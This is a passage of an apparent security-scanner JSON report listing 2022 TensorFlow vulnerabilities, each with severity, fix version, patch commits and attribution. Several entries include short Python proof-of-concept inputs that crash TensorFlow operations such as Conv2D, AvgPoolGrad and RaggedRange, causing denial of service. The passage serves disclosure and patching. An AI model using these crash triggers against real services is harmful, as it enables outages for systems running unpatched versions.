                "markdown": "**Vulnerability CVE-2022-35996**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35996](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35996)|\n\n### Impact\nIf `Conv2D` is given empty `input` and the `filter` and `padding` sizes are valid, the output is all-zeros. This causes division-by-zero floating point exceptions that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\nimport numpy as np\nwith tf.device(\"CPU\"): # also can be triggerred on GPU\n   input = np.ones([1, 0, 2, 1])\n   filter = np.ones([1, 1, 1, 1])\n   strides = ([1, 1, 1, 1])\n   padding = \"EXPLICIT\"\n   explicit_paddings = [0 , 0, 1, 1, 1, 1, 0, 0]\n   data_format = \"NHWC\"\n   res = tf.raw_ops.Conv2D(\n       input=input,\n       filter=filter,\n       strides=strides,\n       padding=padding,\n        explicit_paddings=explicit_paddings,\n       data_format=data_format,\n  )\n```\n\n### Patches\nWe have patched the issue in GitHub commit [611d80db29dd7b0cfb755772c69d60ae5bca05f9](https://github.com/tensorflow/tensorflow/commit/611d80db29dd7b0cfb755772c69d60ae5bca05f9).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Jingyi Shi.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35988",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35988"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35988",
              "help": {
                "text": "Vulnerability CVE-2022-35988\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35988](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35988)\n### Impact\nWhen `tf.linalg.matrix_rank` receives an empty input `a`, the GPU kernel gives a `CHECK` fail that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\na = tf.constant([], shape=[0, 1, 1], dtype=tf.float32)\ntf.linalg.matrix_rank(a=a)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [c55b476aa0e0bd4ee99d0f3ad18d9d706cd1260a](https://github.com/tensorflow/tensorflow/commit/c55b476aa0e0bd4ee99d0f3ad18d9d706cd1260a).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Kang Hong Jin.\n",
                "markdown": "**Vulnerability CVE-2022-35988**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35988](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35988)|\n\n### Impact\nWhen `tf.linalg.matrix_rank` receives an empty input `a`, the GPU kernel gives a `CHECK` fail that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\na = tf.constant([], shape=[0, 1, 1], dtype=tf.float32)\ntf.linalg.matrix_rank(a=a)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [c55b476aa0e0bd4ee99d0f3ad18d9d706cd1260a](https://github.com/tensorflow/tensorflow/commit/c55b476aa0e0bd4ee99d0f3ad18d9d706cd1260a).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Kang Hong Jin.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35968",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35968"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35968",
              "help": {
                "text": "Vulnerability CVE-2022-35968\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35968](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35968)\n### Impact\nThe implementation of `AvgPoolGrad` does not fully validate the input `orig_input_shape`. This results in a `CHECK` failure which can be used to trigger a denial of service attack:\n```python\nimport tensorflow as tf\n\nksize = [1, 2, 2, 1]\nstrides = [1, 2, 2, 1]\npadding = \"VALID\"\ndata_format = \"NHWC\"\norig_input_shape = tf.constant(-536870912, shape=[4], dtype=tf.int32)\ngrad = tf.constant(.0890338004362538, shape=[1,5,7,1], dtype=tf.float64)\ntf.raw_ops.AvgPoolGrad(orig_input_shape=orig_input_shape, grad=grad, ksize=ksize, strides=strides, padding=padding, data_format=data_format)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [3a6ac52664c6c095aa2b114e742b0aa17fdce78f](https://github.com/tensorflow/tensorflow/commit/3a6ac52664c6c095aa2b114e742b0aa17fdce78f).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.\n",
                "markdown": "**Vulnerability CVE-2022-35968**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35968](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35968)|\n\n### Impact\nThe implementation of `AvgPoolGrad` does not fully validate the input `orig_input_shape`. This results in a `CHECK` failure which can be used to trigger a denial of service attack:\n```python\nimport tensorflow as tf\n\nksize = [1, 2, 2, 1]\nstrides = [1, 2, 2, 1]\npadding = \"VALID\"\ndata_format = \"NHWC\"\norig_input_shape = tf.constant(-536870912, shape=[4], dtype=tf.int32)\ngrad = tf.constant(.0890338004362538, shape=[1,5,7,1], dtype=tf.float64)\ntf.raw_ops.AvgPoolGrad(orig_input_shape=orig_input_shape, grad=grad, ksize=ksize, strides=strides, padding=padding, data_format=data_format)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [3a6ac52664c6c095aa2b114e742b0aa17fdce78f](https://github.com/tensorflow/tensorflow/commit/3a6ac52664c6c095aa2b114e742b0aa17fdce78f).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-36014",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-36014"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36014",
              "help": {
                "text": "Vulnerability CVE-2022-36014\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-36014](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36014)\n### Impact\nWhen [`mlir::tfg::TFOp::nameAttr`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/ir/importexport/graphdef_import.cc) receives null type list attributes, it crashes.\n```cpp\n\nStatusOr\u003cunsigned\u003e GraphDefImporter::ArgNumType(const NamedAttrList \u0026attrs,\n                                                const OpDef::ArgDef \u0026arg_def,\n                                                SmallVectorImpl\u003cType\u003e \u0026types) {\n  // Check whether a type list attribute is specified.\n  if (!arg_def.type_list_attr().empty()) {\n    if (auto v = attrs.get(arg_def.type_list_attr()).dyn_cast\u003cArrayAttr\u003e()) {\n      for (Attribute attr : v) {\n        if (auto dtype = attr.dyn_cast\u003cTypeAttr\u003e()) {\n          types.push_back(UnrankedTensorType::get(dtype.getValue()));\n        } else {\n          return InvalidArgument(\"Expected `\", arg_def.type_list_attr(),\n                                 \"` to be a list of types\");\n        }\n      }\n      return v.size();\n    }\n    return NotFound(\"Type attr not found: \", arg_def.type_list_attr());\n  }\n\n  unsigned num = 1;\n  // Check whether a number attribute is specified.\n  if (!arg_def.number_attr().empty()) {\n    if (auto v = attrs.get(arg_def.number_attr()).dyn_cast\u003cIntegerAttr\u003e()) {\n      num = v.getValue().getZExtValue();\n    } else {\n      return NotFound(\"Type attr not found: \", arg_def.number_attr());\n    }\n  }\n\n  // Check for a type or type attribute.\n  Type dtype;\n  if (arg_def.type() != DataType::DT_INVALID) {\n    TF_RETURN_IF_ERROR(ConvertDataType(arg_def.type(), b_, \u0026dtype));\n  } else if (arg_def.type_attr().empty()) {\n    return InvalidArgument(\"Arg `\", arg_def.name(),\n                           \"` has invalid type and no type attribute\");\n  } else {\n    if (auto v = attrs.get(arg_def.type_attr()).dyn_cast\u003cTypeAttr\u003e()) {\n      dtype = v.getValue();\n    } else {\n      return NotFound(\"Type attr not found: \", arg_def.type_attr());\n    }\n  }\n  types.append(num, UnrankedTensorType::get(dtype));\n  return num;\n}\n```\n\n\n### Patches\nWe have patched the issue in GitHub commits [3a754740d5414e362512ee981eefba41561a63a6](https://github.com/tensorflow/tensorflow/commit/3a754740d5414e362512ee981eefba41561a63a6) and [a0f0b9a21c9270930457095092f558fbad4c03e5](https://github.com/tensorflow/tensorflow/commit/a0f0b9a21c9270930457095092f558fbad4c03e5).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n",
                "markdown": "**Vulnerability CVE-2022-36014**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-36014](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36014)|\n\n### Impact\nWhen [`mlir::tfg::TFOp::nameAttr`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/ir/importexport/graphdef_import.cc) receives null type list attributes, it crashes.\n```cpp\n\nStatusOr\u003cunsigned\u003e GraphDefImporter::ArgNumType(const NamedAttrList \u0026attrs,\n                                                const OpDef::ArgDef \u0026arg_def,\n                                                SmallVectorImpl\u003cType\u003e \u0026types) {\n  // Check whether a type list attribute is specified.\n  if (!arg_def.type_list_attr().empty()) {\n    if (auto v = attrs.get(arg_def.type_list_attr()).dyn_cast\u003cArrayAttr\u003e()) {\n      for (Attribute attr : v) {\n        if (auto dtype = attr.dyn_cast\u003cTypeAttr\u003e()) {\n          types.push_back(UnrankedTensorType::get(dtype.getValue()));\n        } else {\n          return InvalidArgument(\"Expected `\", arg_def.type_list_attr(),\n                                 \"` to be a list of types\");\n        }\n      }\n      return v.size();\n    }\n    return NotFound(\"Type attr not found: \", arg_def.type_list_attr());\n  }\n\n  unsigned num = 1;\n  // Check whether a number attribute is specified.\n  if (!arg_def.number_attr().empty()) {\n    if (auto v = attrs.get(arg_def.number_attr()).dyn_cast\u003cIntegerAttr\u003e()) {\n      num = v.getValue().getZExtValue();\n    } else {\n      return NotFound(\"Type attr not found: \", arg_def.number_attr());\n    }\n  }\n\n  // Check for a type or type attribute.\n  Type dtype;\n  if (arg_def.type() != DataType::DT_INVALID) {\n    TF_RETURN_IF_ERROR(ConvertDataType(arg_def.type(), b_, \u0026dtype));\n  } else if (arg_def.type_attr().empty()) {\n    return InvalidArgument(\"Arg `\", arg_def.name(),\n                           \"` has invalid type and no type attribute\");\n  } else {\n    if (auto v = attrs.get(arg_def.type_attr()).dyn_cast\u003cTypeAttr\u003e()) {\n      dtype = v.getValue();\n    } else {\n      return NotFound(\"Type attr not found: \", arg_def.type_attr());\n    }\n  }\n  types.append(num, UnrankedTensorType::get(dtype));\n  return num;\n}\n```\n\n\n### Patches\nWe have patched the issue in GitHub commits [3a754740d5414e362512ee981eefba41561a63a6](https://github.com/tensorflow/tensorflow/commit/3a754740d5414e362512ee981eefba41561a63a6) and [a0f0b9a21c9270930457095092f558fbad4c03e5](https://github.com/tensorflow/tensorflow/commit/a0f0b9a21c9270930457095092f558fbad4c03e5).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35940",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35940"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35940",
              "help": {
                "text": "Vulnerability CVE-2022-35940\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35940](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35940)\n### Impact\nThe [`RaggedRangOp`](https://github.com/tensorflow/tensorflow/blob/0b6b491d21d6a4eb5fbab1cca565bc1e94ca9543/tensorflow/core/kernels/ragged_range_op.cc#L74-L88) function takes an argument `limits` that is eventually used to construct a `TensorShape` as an `int64`. If `limits` is a very large float, it can overflow when converted to an `int64`. This triggers an `InvalidArgument` but also throws an abort signal that crashes the program.\n```python\nimport tensorflow as tf\ntf.raw_ops.RaggedRange(starts=[1.1,0.1],limits=[10.0,1e20],deltas=[1,1])\n```\n\n### Patches\nWe have patched the issue in GitHub commit [37cefa91bee4eace55715eeef43720b958a01192](https://github.com/tensorflow/tensorflow/commit/37cefa91bee4eace55715eeef43720b958a01192).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Jingyi Shi.",
                "markdown": "**Vulnerability CVE-2022-35940**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35940](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35940)|\n\n### Impact\nThe [`RaggedRangOp`](https://github.com/tensorflow/tensorflow/blob/0b6b491d21d6a4eb5fbab1cca565bc1e94ca9543/tensorflow/core/kernels/ragged_range_op.cc#L74-L88) function takes an argument `limits` that is eventually used to construct a `TensorShape` as an `int64`. If `limits` is a very large float, it can overflow when converted to an `int64`. This triggers an `InvalidArgument` but also throws an abort signal that crashes the program.\n```python\nimport tensorflow as tf\ntf.raw_ops.RaggedRange(starts=[1.1,0.1],limits=[10.0,1e20],deltas=[1,1])\n```\n\n### Patches\nWe have patched the issue in GitHub commit [37cefa91bee4eace55715eeef43720b958a01192](https://github.com/tensorflow/tensorflow/commit/37cefa91bee4eace55715eeef43720b958a01192).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Jingyi Shi."
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35970",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35970"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35970",
              "help": {
                "text": "Vulnerability CVE-2022-35970\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35970](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35970)\n### Impact\nIf `QuantizedInstanceNorm` is given `x_min` or `x_max` tensors of a nonzero rank, it results in a segfault that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\noutput_range_given = False\ngiven_y_min = 0\ngiven_y_max = 0\nvariance_epsilon = 1e-05\nmin_separation = 0.001\nx = tf.constant(88, shape=[1,4,4,32], dtype=tf.quint8)\nx_min = tf.constant([], shape=[0], dtype=tf.float32)\nx_max = tf.constant(0, shape=[], dtype=tf.float32)\ntf.raw_ops.QuantizedInstanceNorm(x=x, x_min=x_min, x_max=x_max, output_range_given=output_range_given, given_y_min=given_y_min, given_y_max=given_y_max, variance_epsilon=variance_epsilon, min_separation=min_separation)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [785d67a78a1d533759fcd2f5e8d6ef778de849e0](https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.\n",
                "markdown": "**Vulnerability CVE-2022-35970**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35970](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35970)|\n\n### Impact\nIf `QuantizedInstanceNorm` is given `x_min` or `x_max` tensors of a nonzero rank, it results in a segfault that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\noutput_range_given = False\ngiven_y_min = 0\ngiven_y_max = 0\nvariance_epsilon = 1e-05\nmin_separation = 0.001\nx = tf.constant(88, shape=[1,4,4,32], dtype=tf.quint8)\nx_min = tf.constant([], shape=[0], dtype=tf.float32)\nx_max = tf.constant(0, shape=[], dtype=tf.float32)\ntf.raw_ops.QuantizedInstanceNorm(x=x, x_min=x_min, x_max=x_max, output_range_given=output_range_given, given_y_min=given_y_min, given_y_max=given_y_max, variance_epsilon=variance_epsilon, min_separation=min_separation)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [785d67a78a1d533759fcd2f5e8d6ef778de849e0](https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-36016",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-36016"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36016",
              "help": {
                "text": "Vulnerability CVE-2022-36016\nSeverity: low\nFixed Version: 2.9.1\nLink: [CVE-2022-36016](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36016)\n### Impact\nWhen [`tensorflow::full_type::SubstituteFromAttrs`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/ops/math_ops.cc) receives a `FullTypeDef\u0026 t` that is not exactly three args, it triggers a `CHECK`-fail instead of returning a status.\n```cpp\nStatus SubstituteForEach(AttrMap\u0026 attrs, FullTypeDef\u0026 t) {\n  DCHECK_EQ(t.args_size(), 3);\n\n  const auto\u0026 cont = t.args(0);\n  const auto\u0026 tmpl = t.args(1);\n  const auto\u0026 t_var = t.args(2);\n```\n\n### Patches\nWe have patched the issue in GitHub commit [6104f0d4091c260ce9352f9155f7e9b725eab012](https://github.com/tensorflow/tensorflow/commit/6104f0d4091c260ce9352f9155f7e9b725eab012).\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n",
                "markdown": "**Vulnerability CVE-2022-36016**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.9.1|[CVE-2022-36016](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36016)|\n\n### Impact\nWhen [`tensorflow::full_type::SubstituteFromAttrs`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/ops/math_ops.cc) receives a `FullTypeDef\u0026 t` that is not exactly three args, it triggers a `CHECK`-fail instead of returning a status.\n```cpp\nStatus SubstituteForEach(AttrMap\u0026 attrs, FullTypeDef\u0026 t) {\n  DCHECK_EQ(t.args_size(), 3);\n\n  const auto\u0026 cont = t.args(0);\n  const auto\u0026 tmpl = t.args(1);\n  const auto\u0026 t_var = t.args(2);\n```\n\n### Patches\nWe have patched the issue in GitHub commit [6104f0d4091c260ce9352f9155f7e9b725eab012](https://github.com/tensorflow/tensorflow/commit/6104f0d4091c260ce9352f9155f7e9b725eab012).\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2022-35997",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35997"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35997",
              "help": {
                "text": "Vulnerability CVE-2022-35997\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35997](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35997)\n### Impact\nIf `tf.sparse.cross` receives an input `separator` that is not a scalar, it gives a `CHECK` fail that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\ntf.sparse.cross(inputs=[],name=`a`,separator=tf.constant([`a`, `b`],dtype=tf.string))\n```\n\n### Patches\nWe have patched the issue in GitHub commit [83dcb4dbfa094e33db084e97c4d0531a559e0ebf](https://github.com/tensorflow/tensorflow/commit/83dcb4dbfa094e33db084e97c4d0531a559e0ebf).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Kang Hong Jin.\n",
                "markdown": "**Vulnerability CVE-2022-35997**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35997](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35997)|\n\n### Impact\nIf `tf.sparse.cross` receives an input `separator` that is not a scalar, it gives a `CHECK` fail that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\ntf.sparse.cross(inputs=[],name=`a`,separator=tf.constant([`a`, `b`],dtype=tf.string))\n```\n\n### Patches\nWe have patched the issue in GitHub commit [83dcb4dbfa094e33db084e97c4d0531a559e0ebf](https://github.com/tensorflow/tensorflow/commit/83dcb4dbfa094e33db084e97c4d0531a559e0ebf).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Kang Hong Jin.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35991",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35991"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35991",
              "help": {
                "text": "Vulnerability CVE-2022-35991\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35991](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35991)\n### Impact\nWhen `TensorListScatter` and `TensorListScatterV2` receive an `element_shape` of a rank greater than one, they give a `CHECK` fail that can trigger a denial of service attack.\n```python\nimport tensorflow as tf\narg_0=tf.random.uniform(shape=(2, 2, 2), dtype=tf.float16, maxval=None)\narg_1=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)\narg_2=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)\narg_3=``\ntf.raw_ops.TensorListScatter(tensor=arg_0, indices=arg_1, \nelement_shape=arg_2, name=arg_3)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [bb03fdf4aae944ab2e4b35c7daa051068a8b7f61](https://github.com/tensorflow/tensorflow/commit/bb03fdf4aae944ab2e4b35c7daa051068a8b7f61).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by 刘力源, Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology.\n",
                "markdown": "**Vulnerability CVE-2022-35991**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35991](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35991)|\n\n### Impact\nWhen `TensorListScatter` and `TensorListScatterV2` receive an `element_shape` of a rank greater than one, they give a `CHECK` fail that can trigger a denial of service attack.\n```python\nimport tensorflow as tf\narg_0=tf.random.uniform(shape=(2, 2, 2), dtype=tf.float16, maxval=None)\narg_1=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)\narg_2=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)\narg_3=``\ntf.raw_ops.TensorListScatter(tensor=arg_0, indices=arg_1, \nelement_shape=arg_2, name=arg_3)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [bb03fdf4aae944ab2e4b35c7daa051068a8b7f61](https://github.com/tensorflow/tensorflow/commit/bb03fdf4aae944ab2e4b35c7daa051068a8b7f61).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by 刘力源, Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35993",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35993"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35993",
              "help": {
